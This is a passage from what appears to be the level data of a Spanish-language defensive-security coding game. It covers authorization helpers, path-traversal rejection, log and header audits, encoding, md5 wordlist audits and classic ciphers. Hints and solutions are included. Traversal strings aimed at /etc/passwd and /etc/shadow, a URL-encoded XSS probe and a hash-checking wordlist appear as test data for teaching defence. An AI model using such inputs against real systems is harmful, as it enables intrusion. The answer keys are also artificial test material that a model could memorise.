      "https://shopstack.local/admin": {
        GET: () => ({ status: 200, body: "<html><body>admin</body></html>", headers: {
          "Content-Type": "text/html",
          "Server": "nginx/1.24",
        }}),
      },
      "https://shopstack.local/api/health": {
        GET: () => ({ status: 200, body: '{"ok":true}', headers: {
          "Content-Type": "application/json",
          "X-Content-Type-Options": "nosniff",
          "Strict-Transport-Security": "max-age=31536000",
          "X-Frame-Options": "DENY",
          "Content-Security-Policy": "default-src 'self'",
          "Server": "nginx/1.24",
        }}),
      },
    },
  },

  {
    id: 28, chapter: 4,
    title: "Authz por recurso",
    location: "ShopStack · revisión del middleware",
    concept: "Diseñar can_access(user, resource) — auth ≠ authz",
    intro:
      "\"El bug que más cae en bug bounties no es SQLi: es authz mal escrita. " +
      "El usuario está autenticado, sí, pero ¿puede tocar ESTE recurso? La " +
      "comprobación tiene que estar en el código, recurso por recurso. Vas a " +
      "escribir el helper que el equipo va a llamar en cada endpoint protegido.\"",
    outro:
      "Helper de authz listo. La regla: el dueño manda; admin manda siempre; el " +
      "resto, denegado.",
    diary:
      "Día 28. Auth ≠ Authz. La función la escribo una vez y se aplica en todo " +
      "endpoint protegido. Más útil que mil parches reactivos.",
    mission:
      "Cada user es un dict {id, role}. Cada resource es {id, owner_id}.\n\n" +
      "1) Define can_access(user, resource) que devuelva True solo si: " +
      "user[\"role\"] == \"admin\" OR user[\"id\"] == resource[\"owner_id\"]. " +
      "Cualquier otro caso, False.\n" +
      "2) Recorre la lista PETICIONES de tuplas (user, resource).\n" +
      "3) Para cada una, imprime: \"<user_id> -> r#<res_id>: ALLOW\" o " +
      "\"...: DENY\".\n" +
      "4) Al final, imprime \"Total denegadas: N\".",
    hint:
      'def can_access(user, resource):\n    if user["role"] == "admin":\n        return True\n    return user["id"] == resource["owner_id"]\n\ndenegadas = 0\nfor u, r in PETICIONES:\n    decision = "ALLOW" if can_access(u, r) else "DENY"\n    if decision == "DENY":\n        denegadas += 1\n    print(f"{u[\'id\']} -> r#{r[\'id\']}: {decision}")\nprint(f"Total denegadas: {denegadas}")',
    strategy:
      "PASO 1 — La regla de authz: \"el dueño puede / admin manda siempre /\n" +
      "         el resto, denegado\". Tradúcelo a código:\n" +
      "             def can_access(user, resource):\n" +
      "                 if user[\"role\"] == \"admin\":\n" +
      "                     return True\n" +
      "                 return user[\"id\"] == resource[\"owner_id\"]\n" +
      "         La segunda línea aprovecha que `==` ya devuelve True/False,\n" +
      "         no necesitas if extra.\n" +
      "\n" +
      "PASO 2 — Inicializa contador denegadas = 0.\n" +
      "\n" +
      "PASO 3 — Recorre PETICIONES (lista de tuplas). Cada vuelta\n" +
      "         desempaqueta:\n" +
      "             for u, r in PETICIONES:\n" +
      "\n" +
      "PASO 4 — Calcula la decisión con expresión condicional (ternario):\n" +
      "             decision = \"ALLOW\" if can_access(u, r) else \"DENY\"\n" +
      "         Es la forma compacta de un if/else que devuelve un valor.\n" +
      "\n" +
      "PASO 5 — Si decision == \"DENY\" incrementa el contador.\n" +
      "         Imprime cada decisión: f\"{u['id']} -> r#{r['id']}: {decision}\".\n" +
      "\n" +
      "PASO 6 — Al final, imprime el total de denegadas.\n" +
      "\n" +
      "RECUERDA — Auth ≠ Authz. Auth = ¿quién eres? Authz = ¿puedes hacer\n" +
      "         esto? Cada endpoint protegido debe llamar a can_access\n" +
      "         antes de servir el recurso.",
    skeleton:
      '# La regla de authz: dueño o admin. Ningún otro caso.\n' +
      'def can_access(user, resource):\n' +
      '    if user["role"] == [TODO: rol que pasa siempre]:\n' +
      '        return True\n' +
      '    # == ya devuelve True/False, no hace falta envolver en if\n' +
      '    return user["id"] [TODO: operador igualdad] resource["owner_id"]\n' +
      '\n' +
      'denegadas = 0\n' +
      'for u, r in PETICIONES:\n' +
      '    # Ternario: valor1 if cond else valor2\n' +
      '    decision = "ALLOW" [TODO: keyword condicional] can_access(u, r) else "DENY"\n' +
      '\n' +
      '    if decision == "DENY":\n' +
      '        denegadas += 1\n' +
      '    print(f"{u[\'id\']} -> r#{r[\'id\']}: {decision}")\n' +
      '\n' +
      'print(f"Total denegadas: {denegadas}")',
    starterCode:
      '# Misión en el briefing.\n\nUSERS = {\n    "alice": {"id": "alice", "role": "customer"},\n    "bob":   {"id": "bob",   "role": "customer"},\n    "root":  {"id": "root",  "role": "admin"},\n}\nRES = [\n    {"id": 100, "owner_id": "alice"},\n    {"id": 101, "owner_id": "bob"},\n    {"id": 102, "owner_id": "alice"},\n]\n# Cada petición es (user, resource)\nPETICIONES = [\n    (USERS["alice"], RES[0]),\n    (USERS["alice"], RES[1]),\n    (USERS["bob"],   RES[1]),\n    (USERS["bob"],   RES[2]),\n    (USERS["root"],  RES[2]),\n]\n\n',
    win: { mustPrint: true, mustPrintMin: 5 },
    requires: [
      { type: 'mustContain', regex: /\bdef\s+can_access\b/, message: "Define la función can_access" },
      { type: 'mustContain', regex: /\breturn\b/, message: "La función debe devolver True/False con return" },
    ],
  },

  {
    id: 29, chapter: 4,
    title: "safe_join — bloquear traversal",
    location: "ShopStack · file server",
    concept: "os.path.normpath/abspath para rechazar paths que se escapan",
    intro:
      "\"El servidor sirve archivos de un directorio whitelisted. La forma " +
      "INSEGURA es concatenar el nombre que llega del usuario al path base. La " +
      "forma SEGURA: normalizar y comprobar que el path final sigue dentro de " +
      "base. Vas a escribir esa función.\"",
    outro:
      "safe_join validada contra los casos típicos. Ahora /file rechaza traversal.",
    diary:
      "Día 29. La defensa de path traversal cabe en seis líneas: abspath del " +
      "candidato, abspath del base, y .startswith(). Si no encaja, 403.",
    mission:
      "BASE = \"/var/www/files\"\n\n" +
      "1) Define safe_join(base, name) que devuelva el path resultante si está " +
      "dentro de base, o None si se escapa. Usa os.path.normpath para resolver " +
      "los .. y .startswith(base + os.sep) para validar.\n" +
      "2) Recorre la lista CANDIDATES y, para cada nombre, llama safe_join.\n" +
      "3) Imprime: \"<name> -> OK <path>\" o \"<name> -> RECHAZADO\".",
    hint:
      'import os\n\nBASE = "/var/www/files"\n\ndef safe_join(base, name):\n    candidate = os.path.normpath(os.path.join(base, name))\n    if candidate == base or candidate.startswith(base + os.sep):\n        return candidate\n    return None\n\nfor name in CANDIDATES:\n    r = safe_join(BASE, name)\n    if r:\n        print(f"{name} -> OK {r}")\n    else:\n        print(f"{name} -> RECHAZADO")',
    strategy:
      "PASO 1 — Concepto: si concatenas el nombre del usuario al path base\n" +
      "         sin validar, el atacante puede mandar \"../../etc/passwd\"\n" +
      "         y leer cualquier archivo. Esa es la vulnerabilidad path\n" +
      "         traversal.\n" +
      "         Defensa: NORMALIZA el path resultante (resuelve los .., .)\n" +
      "         y comprueba que sigue empezando por base.\n" +
      "\n" +
      "PASO 2 — La función define dos pasos:\n" +
      "         a) os.path.join(base, name) — concatena correctamente\n" +
      "            (maneja separadores). 'a' + 'b' falla con //, join\n" +
      "            no.\n" +
      "         b) os.path.normpath(...) — resuelve los .. y los .\n" +
      "             /var/www/files/../../etc/passwd → /etc/passwd\n" +
      "         Combinadas: candidate = os.path.normpath(os.path.join(base, name))\n" +
      "\n" +
      "PASO 3 — Validación: el resultado normalizado tiene que seguir\n" +
      "         dentro de BASE. Dos casos válidos:\n" +
      "         - candidate == base (apuntan al mismo directorio).\n" +
      "         - candidate.startswith(base + os.sep) (es un subpath).\n" +
      "         IMPORTANTE el `+ os.sep`: sin él, base \"/var/www/file\"\n" +
      "         pasaría como prefijo de \"/var/www/files\" — falso positivo.\n" +
      "\n" +
      "PASO 4 — Si pasa la validación, return candidate. Si no, return None.\n" +
      "\n" +
      "PASO 5 — Recorre CANDIDATES, llama safe_join para cada uno. Si\n" +
      "         devuelve algo, imprime OK + path. Si None, RECHAZADO.\n" +
      "\n" +
      "PRUEBA mental — Casos que TIENEN que rechazarse:\n" +
      "         \"../../../etc/passwd\" → normaliza a /etc/passwd → fuera de base.\n" +
      "         \"/var/www/files/ok.txt\" → empieza por base → OK.\n" +
      "         \"readme.txt\" → join con base → /var/www/files/readme.txt → OK.\n" +
      "         \"/etc/shadow\" → absoluto, normalizado: /etc/shadow → fuera.",
    skeleton:
      'import os\n' +
      '\n' +
      'BASE = "/var/www/files"\n' +
      '\n' +
      'def safe_join(base, name):\n' +
      '    # 1) join concatena bien con separadores\n' +
      '    # 2) normpath resuelve los .. y los .\n' +
      '    candidate = os.path.[TODO: normalizar el path](os.path.join(base, name))\n' +
      '\n' +
      '    # ¿El resultado sigue dentro de base?\n' +
      '    # OJO: " + os.sep" para evitar prefix falso positivo\n' +
      '    if candidate == base or candidate.[TODO: empieza por](base + os.sep):\n' +
      '        return candidate\n' +
      '    return None\n' +
      '\n' +
      'for name in CANDIDATES:\n' +
      '    r = safe_join(BASE, name)\n' +
      '    if r:\n' +
      '        print(f"{name} -> OK {r}")\n' +
      '    else:\n' +
      '        print(f"{name} -> RECHAZADO")',
    starterCode:
      '# Misión en el briefing.\nimport os\n\nBASE = "/var/www/files"\nCANDIDATES = [\n    "readme.txt",\n    "subdir/notes.md",\n    "../../../../etc/passwd",\n    "..\\\\..\\\\windows\\\\system32",\n    "./legit.png",\n    "/var/www/files/ok.txt",\n    "/etc/shadow",\n]\n\n',
    win: { mustPrint: true, mustPrintMin: 5 },
    requires: [
      { type: 'mustContain', regex: /\bdef\s+safe_join\b/, message: "Define la función safe_join" },
      { type: 'mustContain', regex: /\bos\.path\.normpath\b/, message: "Usa os.path.normpath para resolver el path" },
      { type: 'mustContain', regex: /\bimport\s+os\b/, message: "Importa os" },
    ],
  },

  {
    id: 30, chapter: 4,
    title: "Evaluación: auditoría defensiva",
    location: "Sala de evaluaciones · ShopStack",
    concept: "EVALUACIÓN — combinar log scan + headers + regex",
    is_exam: true,
    is_checkpoint: true,
    intro:
      "\"Audita ShopStack. Identifica scanners por log, headers ausentes en una " +
      "URL, y resume todo en JSON. Sin pista.\"",
    outro:
      "Cap 4 cerrado. Próximo: cripto y datos.",
    diary:
      "Día 30. Cuarto examen. Auditoría completa en menos de 22 líneas. JSON " +
      "estructurado al final. Esto sí lo enseñaría a un junior.",
    mission:
      "Tienes LOGS (lista de tuplas (ip, path)) y vas a hacer fetch_url a " +
      "https://shopstack.local/admin (que devuelve sus headers). Genera un dict " +
      "report con:\n\n" +
      "  • scanners: lista de IPs con >=2 hits a paths sospechosos " +
      "(/.env, /.git, /admin, /wp-login)\n" +
      "  • missing_headers: lista de headers REQUERIDOS que no estén en la " +
      "respuesta de /admin (REQUERIDOS = los 4 del nivel 27)\n" +
      "  • findings_count: int = len(scanners) + len(missing_headers)\n\n" +
      "Imprime el reporte como JSON con indent=2.\n\n" +
      "RESTRICCIONES:\n" +
      "• Máximo 22 líneas\n" +
      "• Debes definir al menos una función con def\n" +
      "• Debes usar collections.Counter\n" +
      "• Debes usar json.dumps con indent=2",
    hint: "Evaluación sin pista.",
    solution:
      'import json\nfrom collections import Counter\n\nSUS = ("/.env", "/.git", "/admin", "/wp-login")\nREQUERIDOS = ["Content-Security-Policy", "Strict-Transport-Security", "X-Frame-Options", "X-Content-Type-Options"]\n\ndef detectar_scanners(logs):\n    sus = Counter(ip for ip, path in logs if any(s in path for s in SUS))\n    return [ip for ip, n in sus.items() if n >= 2]\n\nscanners = detectar_scanners(LOGS)\nr = fetch_url("https://shopstack.local/admin")\nmissing = [h for h in REQUERIDOS if h not in r.headers]\nreport = {\n    "scanners": scanners,\n    "missing_headers": missing,\n    "findings_count": len(scanners) + len(missing),\n}\nprint(json.dumps(report, indent=2))',
    starterCode:
      '# EVALUACIÓN — Capítulo 4\n# Detectar scanners en LOGS + auditar headers de /admin -> reporte JSON\n\nLOGS = [\n    ("10.0.0.5",    "/"),\n    ("10.0.0.5",    "/products"),\n    ("203.0.113.7", "/.env"),\n    ("203.0.113.7", "/admin"),\n    ("203.0.113.7", "/.git/config"),\n    ("198.51.100.2","/"),\n    ("203.0.113.7", "/wp-login.php"),\n    ("10.0.0.9",    "/account"),\n]\n\n',
    win: { mustPrint: true },
    restrictions: [
      { type: 'maxLines', value: 22, message: "Máximo 22 líneas" },
      { type: 'mustContain', regex: /\bdef\s+\w+/, message: "Define al menos una función" },
      { type: 'mustContain', regex: /\bCounter\b/, message: "Usa collections.Counter" },
      { type: 'mustContain', regex: /\bjson\.dumps\s*\(/, message: "Usa json.dumps" },
      { type: 'mustContain', regex: /\bindent\s*=\s*2/, message: "Usa indent=2" },
    ],
    endpoints: {
      "https://shopstack.local/admin": {
        GET: () => ({ status: 200, body: "<html>admin</html>", headers: {
          "Content-Type": "text/html",
          "Server": "nginx/1.24",
        }}),
      },
    },
  },

  // ============================================================
  // CAPÍTULO 5 — CRYPTO Y DATOS (31-35)
  // Stdlib pura: base64, hashlib, urllib.parse — todo viene con Pyodide.
  // ============================================================
  {
    id: 31, chapter: 5,
    title: "Codificaciones básicas",
    location: "Forense · cadenas extrañas en logs",
    concept: "base64, hex, urlencode (no son cifrado)",
    is_checkpoint: true,
    intro:
      "\"En logs y tráfico capturado vas a encontrar strings que parecen cifrados pero " +
      "son solo CODIFICADOS. base64, hex, url-encoding NO protegen — solo transportan. " +
      "Distinguirlos es básico antes de meterse en crypto de verdad.\"",
    outro:
      "Codificaciones identificadas y revertidas.",
    diary:
      "Día 31. base64 != cifrado. Solo es texto a base 64 caracteres imprimibles. " +
      "Cualquiera con import base64 lo revierte. Si veo eso en producción 'protegiendo' " +
      "datos sensibles, es bandera roja inmediata.",
    mission:
      "Tienes tres cadenas interceptadas:\n\n" +
      "  s1 = \"YWRtaW46c3VwZXJzZWNyZXQ=\"     (base64)\n" +
      "  s2 = \"68656c6c6f20776f726c64\"        (hex)\n" +
      "  s3 = \"%3Cscript%3Ealert%281%29%3C%2Fscript%3E\" (url-encoded)\n\n" +
      "Para cada una decodifícala (usa los módulos stdlib: base64, bytes.fromhex, " +
      "urllib.parse.unquote) e imprime el resultado en claro.",
    hint:
      'import base64\nfrom urllib.parse import unquote\n\ns1 = "YWRtaW46c3VwZXJzZWNyZXQ="\nprint("base64:", base64.b64decode(s1).decode())\n\ns2 = "68656c6c6f20776f726c64"\nprint("hex:", bytes.fromhex(s2).decode())\n\ns3 = "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"\nprint("url:", unquote(s3))',
    starterCode:
      '# Misión en el briefing. Tres cadenas interceptadas, cada una con\n# una codificación distinta. Identifica cada formato y decodifica.\n\ns1 = "YWRtaW46c3VwZXJzZWNyZXQ="\ns2 = "68656c6c6f20776f726c64"\ns3 = "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"\n\n',
    strategy:
      "PASO 1 — Identifica cada codificación visualmente:\n" +
      "         - s1 termina en \"=\" y solo letras/dígitos/+/=  → es base64.\n" +
      "         - s2 son solo dígitos 0-9 y letras a-f → es hexadecimal.\n" +
      "         - s3 contiene secuencias %XX (ej. %3C) → es URL-encoded.\n" +
      "\n" +
      "PASO 2 — base64: import base64 al inicio del script.\n" +
      "         - Función a usar: base64.b64decode(string).\n" +
      "         - Devuelve BYTES (no string). Para verlo como texto:\n" +
      "             base64.b64decode(s1).decode()\n" +
      "         .decode() convierte bytes a string asumiendo UTF-8.\n" +
      "\n" +
      "PASO 3 — hex: NO necesita import (es built-in de bytes).\n" +
      "         - bytes.fromhex(string_hex) devuelve bytes.\n" +
      "         - .decode() para verlos como texto.\n" +
      "\n" +
      "PASO 4 — URL-encoded: from urllib.parse import unquote.\n" +
      "         - unquote(string) directamente devuelve un string,\n" +
      "           NO bytes. No hace falta .decode().\n" +
      "\n" +
      "PASO 5 — Imprime cada uno con un prefijo identificativo:\n" +
      "             print(\"base64:\", base64.b64decode(s1).decode())\n" +
      "             print(\"hex:\", bytes.fromhex(s2).decode())\n" +
      "             print(\"url:\", unquote(s3))\n" +
      "\n" +
      "PASO 6 — Reflexión: el ejercicio demuestra que estas tres NO son\n" +
      "         cifrado. Son solo representaciones distintas del mismo\n" +
      "         dato. Cualquiera puede revertirlas con stdlib.",
    skeleton:
      '[TODO: import base64]\n' +
      'from urllib.parse import [TODO: la función para URL-decode]\n' +
      '\n' +
      's1 = "YWRtaW46c3VwZXJzZWNyZXQ="                  # base64\n' +
      's2 = "68656c6c6f20776f726c64"                     # hex\n' +
      's3 = "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"   # URL-encoded\n' +
      '\n' +
      '# base64 -> bytes; .decode() para pasar a string\n' +
      'print("base64:", base64.[TODO: función decode b64](s1).decode())\n' +
      '\n' +
      '# hex -> bytes; built-in de la clase bytes\n' +
      'print("hex:", bytes.[TODO: método clase para crear bytes desde hex](s2).decode())\n' +
      '\n' +
      '# URL-encoded -> string directamente, sin .decode()\n' +
      'print("url:", unquote(s3))',
    win: { mustPrint: true, mustPrintMin: 3 },
    requires: [
      { type: 'mustContain', regex: /\bimport\s+base64\b|from\s+base64\b/, message: "Importa base64" },
      { type: 'mustContain', regex: /\bb64decode\s*\(/, message: "Usa b64decode(...)" },
      { type: 'mustContain', regex: /\bfromhex\s*\(/, message: "Usa bytes.fromhex(...)" },
      { type: 'mustContain', regex: /\bunquote\s*\(/, message: "Usa urllib.parse.unquote(...)" },
    ],
  },

  {
    id: 32, chapter: 5,
    title: "Hashes y diccionarios",
    location: "Forense · auditoría post-breach",
    concept: "hashlib + auditoría de robustez de hashes",
    intro:
      "\"Auditoría defensiva: una empresa cliente sufrió un leak de su tabla users " +
      "(hashes md5 sin sal — práctica obsoleta de los 2000). El CISO te pide cuantificar " +
      "el riesgo: ¿cuántos hashes serían triviales de revertir con una wordlist mínima? " +
      "Hash NO es cifrado, no se 'descifra' — pero sí se prueban candidatos hasta " +
      "encontrar colisión. Tu salida es un veredicto por usuario, no la contraseña.\"",
    outro:
      "Veredicto entregado. Recomendación al CISO: migrar a bcrypt/argon2 y forzar " +
      "rotación de contraseñas. Nunca a md5 ni sha1 sin sal.",
    diary:
      "Día 32. md5 sin sal cae en milisegundos contra cualquier wordlist mínima. bcrypt " +
      "y argon2 son lentos a propósito — diseñados para ser caros incluso con GPUs. La " +
      "salida del informe NO es la contraseña en claro: es el veredicto de robustez. " +
      "Imprimir el plaintext en un reporte sería negligente.",
    mission:
      "Hashes del leak (md5, 3 muestras):\n\n" +
      "  user_a → 5f4dcc3b5aa765d61d8327deb882cf99\n" +
      "  user_b → e10adc3949ba59abbe56e057f20f883e\n" +
      "  user_c → 25d55ad283aa400af464c76d713c07ad\n\n" +
      "Wordlist mínima de auditoría: [\"password\", \"123456\", \"12345678\", \"qwerty\", " +
      "\"admin\", \"letmein\"]\n\n" +
      "Para cada usuario, comprueba si ALGUNA palabra de la wordlist produce su hash. " +
      "NO imprimas la palabra: imprime el VEREDICTO.\n\n" +
      "  → \"user_a (5f4dcc3b...): TRIVIALMENTE ROMPIBLE (md5 sin sal vs wordlist mínima)\"\n" +
      "  → \"user_x (...): no rompible con esta wordlist\"\n\n" +
      "Al final imprime: \"N/3 hashes rompibles con wordlist de 6 palabras → migrar YA " +
      "a bcrypt/argon2\".",
    hint:
      'import hashlib\n\nhashes = {\n    "user_a": "5f4dcc3b5aa765d61d8327deb882cf99",\n    "user_b": "e10adc3949ba59abbe56e057f20f883e",\n    "user_c": "25d55ad283aa400af464c76d713c07ad",\n}\nwordlist = ["password", "123456", "12345678", "qwerty", "admin", "letmein"]\n\nrompibles = 0\nfor user, h in hashes.items():\n    rompible = any(hashlib.md5(w.encode()).hexdigest() == h for w in wordlist)\n    if rompible:\n        rompibles += 1\n        print(f"{user} ({h[:8]}...): TRIVIALMENTE ROMPIBLE (md5 sin sal vs wordlist mínima)")\n    else:\n        print(f"{user} ({h[:8]}...): no rompible con esta wordlist")\nprint(f"{rompibles}/{len(hashes)} hashes rompibles con wordlist de {len(wordlist)} palabras → migrar YA a bcrypt/argon2")',
    strategy:
      "PASO 1 — Imports: hashlib (stdlib).\n" +
      "         Define los datos: dict hashes (usuario → hash hex) y\n" +
      "         lista wordlist con candidatos. Las pones tú a partir\n" +
      "         de la misión.\n" +
      "\n" +
      "PASO 2 — Para hashear con hashlib, importante:\n" +
      "         - hashlib.md5 NECESITA bytes, no string. Convierte con\n" +
      "           .encode(): hashlib.md5(palabra.encode())\n" +
      "         - Ese objeto tiene .hexdigest() que devuelve string\n" +
      "           hexadecimal (32 chars para md5).\n" +
      "         Patrón: hashlib.md5(w.encode()).hexdigest()\n" +
      "\n" +
      "PASO 3 — La pregunta a contestar por usuario es ¿alguna palabra\n" +
      "         de la wordlist produce el hash de este usuario?\n" +
      "         La función built-in any(iterable) devuelve True si al\n" +
      "         menos un elemento es truthy. Combinada con generador:\n" +
      "             any(hashlib.md5(w.encode()).hexdigest() == h\n" +
      "                 for w in wordlist)\n" +
      "         Esto es la forma idiomática Python.\n" +
      "\n" +
      "PASO 4 — Inicializa contador rompibles = 0. Itera el dict con\n" +
      "         .items() — para tener (usuario, hash) en cada vuelta.\n" +
      "\n" +
      "PASO 5 — Para cada usuario:\n" +
      "         a) Calcula rompible (True/False) con any.\n" +
      "         b) Si True: incrementa contador, imprime VEREDICTO.\n" +
      "            CRUCIAL: imprime el prefijo del hash (h[:8]) para\n" +
      "            identificar — NUNCA la palabra encontrada.\n" +
      "         c) Si False: imprime 'no rompible con esta wordlist'.\n" +
      "\n" +
      "PASO 6 — Al final, imprime el resumen con la recomendación de\n" +
      "         migrar a bcrypt/argon2. Esto es el output que va al\n" +
      "         CISO — diferente de un script de cracking.",
    skeleton:
      'import hashlib\n' +
      '\n' +
      'hashes = {\n' +
      '    "user_a": "5f4dcc3b5aa765d61d8327deb882cf99",\n' +
      '    "user_b": "e10adc3949ba59abbe56e057f20f883e",\n' +
      '    "user_c": "25d55ad283aa400af464c76d713c07ad",\n' +
      '}\n' +
      'wordlist = ["password", "123456", "12345678", "qwerty", "admin", "letmein"]\n' +
      '\n' +
      'rompibles = 0\n' +
      'for user, h in hashes.[TODO: método para iterar (clave, valor)]:\n' +
      '    # any(...) -> True si AL MENOS UN candidato matchea\n' +
      '    rompible = [TODO: función built-in que evalúa "alguno cumple"](\n' +
      '        hashlib.md5(w.[TODO: convertir string a bytes]()).hexdigest() == h\n' +
      '        for w in wordlist\n' +
      '    )\n' +
      '\n' +
      '    if rompible:\n' +
      '        rompibles += 1\n' +
      '        # Imprime VEREDICTO, no la palabra encontrada\n' +
      '        print(f"{user} ({h[:8]}...): TRIVIALMENTE ROMPIBLE "\n' +
      '              f"(md5 sin sal vs wordlist mínima)")\n' +
      '    else:\n' +
      '        print(f"{user} ({h[:8]}...): no rompible con esta wordlist")\n' +
      '\n' +
      'print(f"{rompibles}/{len(hashes)} hashes rompibles con wordlist de "\n' +
      '      f"{len(wordlist)} palabras → migrar YA a bcrypt/argon2")',
    starterCode:
      '# Auditoría defensiva de robustez de hashes md5 sin sal.\n# IMPORTANTE: el output debe ser el VEREDICTO, no la palabra encontrada.\n\n',
    win: { mustPrint: true, mustPrintMin: 3 },
    requires: [
      { type: 'mustContain', regex: /\bimport\s+hashlib\b/, message: "Importa hashlib" },
      { type: 'mustContain', regex: /hashlib\.\w+/, message: "Usa hashlib (md5, sha1, etc.)" },
      { type: 'mustContain', regex: /\.hexdigest\s*\(/, message: "Usa .hexdigest() para obtener el hash en hex" },
    ],
  },

  {
    id: 33, chapter: 5,
    title: "César y XOR",
    location: "Comunicación interceptada",
    concept: "Cifrado clásico (César, XOR de byte único)",
    gives_potion: true,
    intro:
      "\"Mensajes interceptados de un grupo amateur. Usan César (rotar letras) y XOR " +
      "con clave de 1 byte. Ambos son trivialmente rompibles — César por fuerza bruta " +
      "(26 rotaciones), XOR-1 por probar 256 claves. Fundamental para entender por qué " +
      "el padding y las claves largas importan en crypto serio.\"",
    outro:
      "Mensajes descifrados. VPN burner añadida.",
    diary:
      "Día 33. César con 26 candidatos = lo rompe un humano leyendo. XOR con clave " +
      "de 1 byte = lo rompe un script en una millonésima de segundo. Crypto seria " +
      "necesita claves grandes y padding bien hecho.",
    mission:
      "1) MENSAJE CÉSAR: \"Khoor pxqgr\" (rotación desconocida). Itera las 26 " +
      "rotaciones e imprime cada candidato. Identifica visualmente el correcto.\n\n" +
      "2) MENSAJE XOR: bytes [0x21, 0x40, 0x4f, 0x4f, 0x4c, 0x6b, 0x57, 0x4c, 0x57, " +
      "0x4f, 0x45]. Itera las 256 claves posibles, aplica XOR a cada byte, e imprime " +
      "los candidatos cuyo resultado sea 100% ASCII imprimible.",
    hint:
      '# César — fuerza bruta de las 26 rotaciones\nciphertext = "Khoor pxqgr"\nfor shift in range(26):\n    plain = ""\n    for c in ciphertext:\n        if c.isalpha():\n            base = ord("A") if c.isupper() else ord("a")\n            plain += chr((ord(c) - base - shift) % 26 + base)\n        else:\n            plain += c\n    print(f"shift={shift:2}: {plain}")\n\n# XOR de un solo byte\ndata = bytes([0x21, 0x40, 0x4f, 0x4f, 0x4c, 0x6b, 0x57, 0x4c, 0x57, 0x4f, 0x45])\nfor key in range(256):\n    decoded = bytes(b ^ key for b in data)\n    if all(32 <= c < 127 for c in decoded):\n        print(f"xor key=0x{key:02x}: {decoded.decode()}")',
    strategy:
      "PARTE 1 — César (rotación de letras).\n" +
      "PASO 1 — Para cada posible rotación (0 a 25), genera el candidato\n" +
      "         desplazando hacia atrás cada letra.\n" +
      "PASO 2 — ord(c) devuelve el código ASCII del carácter (ord('A')=65,\n" +
      "         ord('a')=97). chr(n) hace lo contrario: número→carácter.\n" +
      "PASO 3 — La aritmética modular % 26 es lo que hace que la rotación\n" +
      "         dé la vuelta (ej. 'a' rotado -3 = 'x', no un carácter raro).\n" +
      "         La fórmula:\n" +
      "             nueva_letra = chr((ord(c) - base - shift) % 26 + base)\n" +
      "         donde base es ord('A') si mayúscula o ord('a') si minúscula.\n" +
      "PASO 4 — c.isalpha() para distinguir letras de espacios/puntuación.\n" +
      "         Los no-alpha se copian tal cual, los alpha se desplazan.\n" +
      "PASO 5 — Imprime cada candidato con su shift. El correcto se ve\n" +
      "         como palabras en español/inglés.\n" +
      "\n" +
      "PARTE 2 — XOR de byte único.\n" +
      "PASO 6 — Itera todas las claves posibles: range(256) (un byte va\n" +
      "         de 0 a 255).\n" +
      "PASO 7 — Para cada clave, aplica XOR a CADA byte de los datos:\n" +
      "             decoded = bytes(b ^ key for b in data)\n" +
      "         Ese generador construye un nuevo bytes con cada byte XOR\n" +
      "         con la clave.\n" +
      "PASO 8 — Filtra: solo te interesan los candidatos cuyo resultado\n" +
      "         sea ASCII imprimible (32 <= código_byte < 127). Función\n" +
      "         built-in all() comprueba que TODOS los elementos cumplan.\n" +
      "             all(32 <= c < 127 for c in decoded)\n" +
      "         Nota la comparación encadenada — sintaxis preciosa de Python.\n" +
      "PASO 9 — Imprime los candidatos válidos. Probablemente solo uno\n" +
      "         dará texto legible: ese es la clave correcta.",
    skeleton:
      '# === CÉSAR ===\n' +
      'ciphertext = "Khoor pxqgr"\n' +
      'for shift in range(26):\n' +
      '    plain = ""\n' +
      '    for c in ciphertext:\n' +
      '        if c.[TODO: método para saber si es letra]():\n' +
      '            # base depende de mayúscula/minúscula\n' +
      '            base = ord("A") if c.isupper() else ord("a")\n' +
      '            # Aritmética modular para que dé la vuelta\n' +
      '            plain += chr(([TODO: ord(c) - base - shift] ) % 26 + base)\n' +
      '        else:\n' +
      '            plain += c   # no-letra (espacio, puntuación) tal cual\n' +
      '    print(f"shift={shift:2}: {plain}")\n' +
      '\n' +
      '# === XOR DE UN BYTE ===\n' +
      'data = bytes([0x21, 0x40, 0x4f, 0x4f, 0x4c, 0x6b, 0x57, 0x4c, 0x57, 0x4f, 0x45])\n' +
      'for key in range([TODO: 256, todas las claves de un byte]):\n' +
      '    # Aplica XOR byte a byte construyendo un nuevo bytes\n' +
      '    decoded = bytes(b [TODO: operador XOR] key for b in data)\n' +
      '\n' +
      '    # Filtro: TODOS los bytes deben ser ASCII imprimible\n' +
      '    if all([TODO: 32 <= c < 127] for c in decoded):\n' +
      '        print(f"xor key=0x{key:02x}: {decoded.decode()}")',
    starterCode:
      '# Dos mensajes interceptados. Misión y formato de salida en el briefing.\n\nciphertext = "Khoor pxqgr"\ndata = bytes([0x21, 0x40, 0x4f, 0x4f, 0x4c, 0x6b, 0x57, 0x4c, 0x57, 0x4f, 0x45])\n\n',
    win: { mustPrint: true, mustPrintMin: 3 },
    requires: [
      { type: 'mustContain', regex: /\bord\s*\(|\bchr\s*\(/, message: "Usa ord()/chr() para César" },
      { type: 'mustContain', regex: /\^/, message: "Usa el operador XOR (^)" },
      { type: 'mustContain', regex: /\bfor\s+\w+\s+in\s+range\b/, message: "Itera con for + range" },
    ],
  },

  {
    id: 34, chapter: 5,
    title: "Bitwise: máscaras y flags",
    location: "Forense · permisos del sistema",
    concept: "Operadores bitwise (& | ^ ~ << >>)",
    intro:
      "\"En syscalls, permisos de archivo y muchos protocolos, los flags vienen " +
      "comprimidos en bits de un solo entero. Para leerlos haces AND con la máscara " +
      "del flag. Para combinarlos, OR. Esto aparece literalmente en cualquier código " +
      "C de bajo nivel y en muchos campos de protocolos de red.\"",
    outro:
      "Flags decodificados.",
    diary:
      "Día 34. AND para leer un flag, OR para activar, XOR para alternar, NOT para " +
      "invertir. Los desplazamientos << y >> mueven bits. Útil incluso en parsing de " +
      "campos comprimidos en pcap.",
    mission:
      "Permisos UNIX en octal: rwxrwxrwx = 0o777. Cada bit cuenta. Tienes un valor " +
      "permisos = 0o751 (binario: 111 101 001 = rwxr-x--x).\n\n" +
      "1) Imprime el valor en binario (8 bits sin el 0b inicial — usa f-string con :08b).\n" +
      "2) Comprueba con bitwise AND si el OWNER tiene bit de execute (máscara 0o100). " +
      "Imprime: \"owner-x: True/False\".\n" +
      "3) Comprueba si OTHERS tiene bit de write (máscara 0o002). Imprime resultado.\n" +
